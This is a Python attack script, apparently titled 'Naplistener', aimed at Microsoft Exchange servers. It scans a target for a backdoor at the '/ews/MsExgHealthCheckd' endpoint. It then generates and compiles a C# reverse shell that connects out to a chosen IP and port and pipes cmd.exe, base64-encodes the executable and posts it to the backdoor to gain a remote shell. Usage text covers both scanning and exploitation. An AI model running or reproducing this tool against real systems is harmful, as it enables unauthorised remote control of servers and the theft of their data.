#!/usr/bin/python3
# @Мартин.   2024/5/5
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝
# Microsoft-HTTPAPI/2.0
import requests
import platform
import subprocess
import base64
import requests.utils
import urllib3
import argparse
import textwrap
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)


logo = '''
 /$$   /$$  /$$$$$$  /$$$$$$$  /$$       /$$$$$$  /$$$$$$  /$$$$$$$$ /$$$$$$$$ /$$   /$$ /$$$$$$$$ /$$$$$$$
| $$$ | $$ /$$__  $$| $$__  $$| $$      |_  $$_/ /$$__  $$|__  $$__/| $$_____/| $$$ | $$| $$_____/| $$__  $$
| $$$$| $$| $$  \ $$| $$  \ $$| $$        | $$  | $$  \__/   | $$   | $$      | $$$$| $$| $$      | $$  \ $$
| $$ $$ $$| $$$$$$$$| $$$$$$$/| $$        | $$  |  $$$$$$    | $$   | $$$$$   | $$ $$ $$| $$$$$   | $$$$$$$/
| $$  $$$$| $$__  $$| $$____/ | $$        | $$   \____  $$   | $$   | $$__/   | $$  $$$$| $$__/   | $$__  $$
| $$\  $$$| $$  | $$| $$      | $$        | $$   /$$  \ $$   | $$   | $$      | $$\  $$$| $$      | $$  \ $$
| $$ \  $$| $$  | $$| $$      | $$$$$$$$ /$$$$$$|  $$$$$$/   | $$   | $$$$$$$$| $$ \  $$| $$$$$$$$| $$  | $$
|__/  \__/|__/  |__/|__/      |________/|______/ \______/    |__/   |________/|__/  \__/|________/|__/  |__/
                                                                                    S-H4CK13@Maptnh.
'''

class Main:
    def __init__(self,args):
        self.source= '''
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace Reverse
{
    public class Run
    {
        static StreamWriter streamWriter;

        public Run()
        {
            using (TcpClient client = new TcpClient("@IP", @PORT))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();
                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        public static void Main(string[] args)
        {
            new Run();
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
'''

        if args.LH and args.LP and args.URL:
            self.__run(args.LH,args.LP,args.URL)
        elif args.URL:
            print("[*] Scaning remote server...")
            self.__send_payload(args.URL,'',True)
        else:
            print("[!] Incorrect parameter options.")

    def __run(self,lhost,lport,url):
        url = url.strip('/')
        plat = self.__check_os()
        if plat:
            plat_n= self.__check_tools(plat)
            if plat_n == 1 or plat_n == 4:
                source = self.source.replace("@IP",lhost)
                source = source.replace("@PORT",lport)
                if self.__save_file(source):
                    print("[+] Create Payload.")
                    if self.__execute_command(r'"C:\Program Files\Mono\bin\mcs.bat" -out:Reverse.exe Reverse.cs' if plat_n == 1 else 'mcs -out:Reverse.exe Reverse.cs'):
                        print("[+] Compilation of payload completed")
                        base64_payload = self.__conver_base64()
                        if base64_payload:
                            print("[+] Base64 Encoding..")
                            print(f"[*] Sending payload to target [{url}]")
                            self.__send_payload(url,str(requests.utils.quote(base64_payload, safe='')))
                        else:
                            print("[-] .exe Error..")

    def __check_tools(self,plat):
        if plat == 'Windows' or plat == 'Linux':
            if self.__execute_command(r'"C:\Program Files\Mono\bin\mcs.bat" --version' if plat == 'Windows' else 'mcs --version'):
                return 1 if plat == 'Windows' else 4
            else:
                print("[+] Downloading Mono....")
                if plat == "Windows":
                    if self.__download_file("https://download.mono-project.com/archive/6.12.0/windows-installer/mono-6.12.0.206-x64-0.msi","mono.msi"):
                        print("[*] Please install mono in the ./Download/Mono.msi directory and try running the script again...")
                        return 2
                    else:
                        print("[!] Download Mono fail!:Check your network.")
                        return 3
                elif plat == "Linux":
                    print("[*] Try execute :sudo apt install mono-devel")
                    if self.__execute_command("sudo apt install mono-devel"):
                        return 2
                    else:
                        print("[!] Please install manually.")
                        return 3
        else:
            return False

    def __execute_command(self,command):
        try:
            subprocess.run(command, shell=True, check=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except subprocess.CalledProcessError:
            return False

    def __save_file(self,note):
        try:
            with open('Reverse.cs','w',encoding='utf-8')as f:
                f.write(note)
        except Exception as e:
            print('[-] ')
            return False
        else:
            return True

    def __check_os(self):
        os_type = platform.system()
        if os_type == 'Windows':
            return 'Windows'
        elif os_type == 'Linux':
            return 'Linux'
        else:
            print("[?] Unknow your Os Version")
            return False

    def __download_file(self,url, filename=None):
        if not filename:
            filename = url.split('/')[-1]
        try:
            response = requests.get(url,verify=False)
            with open('./download/'+filename, 'wb') as f:
                f.write(response.content)
        except Exception as e:
            return False
        else:
            return True

    def __conver_base64(self):
        try:
            with open('./Reverse.exe', 'rb') as f:
                binary_data = f.read()
                base64_data = base64.b64encode(binary_data).decode('utf-8')
                base64_data = base64_data.replace('\n', '')
            return base64_data
        except Exception as e:
            return False

    def __send_payload(self,url,data,scanner=False):
        if scanner:
            datas = f'sdafwe3rwe23='
        else:
            datas = f"sdafwe3rwe23={data}"
        try:
            res = requests.post(url+"/ews/MsExgHealthCheckd",data=datas,verify=False,timeout=10,proxies={'http':'http://127.0.0.1:8080'})
        except TimeoutError:
            print("[-] Timeout target not respon...")
        except Exception:
            print("[!] Target not found....")
        else:
            if res.status_code == 200:
                if scanner:
                    print("[+] Target has a backdoor.")
                else:
                    print("[+] Exploit successful.")
                    print("========WIN========")
            else:
                if scanner:
                    print("[-] There is no backdoor for the target.")
                else:
                    print("[-] Exploit Fail...")




if __name__ in '__main__':
    print(logo)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
            Example:
                author-Github==>https://github.com/MartinxMax
            Basic usage:
                python3 {Naplistener} -u <(http/https)://xxx.xxx> # Only detect rear doors.
                python3 {Naplistener} -lh <Reverse shell IP> -lp <Reverse shell port> -u <(http/https)://xxx.xxx> # Using backdoor and build reverse shell.
                '''.format(Naplistener=sys.argv[0])))
    parser.add_argument('-lh', '--LH',default='', help='Reverse shell ip')
    parser.add_argument('-lp', '--LP',default='', help='Reverse shell port')
    parser.add_argument('-u', '--URL',default='', help='Remote server')
    args = parser.parse_args()
    Main(args)
